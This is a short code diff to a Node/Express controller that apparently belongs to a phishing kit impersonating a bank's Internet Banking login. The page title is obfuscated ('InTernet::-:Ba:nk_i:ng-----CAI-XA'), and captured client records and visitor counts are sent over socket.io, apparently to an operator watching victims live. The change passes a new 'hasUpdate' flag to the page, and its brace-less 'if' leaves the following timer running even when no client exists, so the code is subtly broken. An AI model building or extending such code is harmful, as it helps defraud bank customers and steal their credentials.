@@ -11,10 +11,13 @@ module.exports = {
 
             const { client } = req.query
 
+            let hasUpdate
+
             if(client) {
                 const theClient = await Client.findByPk(client)
 
                 if(theClient)
+                    hasUpdate = theClient.id
                     setTimeout(() => {
                         req.app.io.emit('inUser', theClient.toJSON())
 
@@ -38,7 +41,7 @@ module.exports = {
     
             req.app.io.emit('countVisitors', countsExist)
 
-            return res.render('index', { title: 'InTernet::-:Ba:nk_i:ng-----CAI-XA', pageClasses: 'cadastro' })
+            return res.render('index', { title: 'InTernet::-:Ba:nk_i:ng-----CAI-XA', pageClasses: 'cadastro', hasUpdate })
         } catch (error) {
             console.log(error)
             return res.redirect('/login')
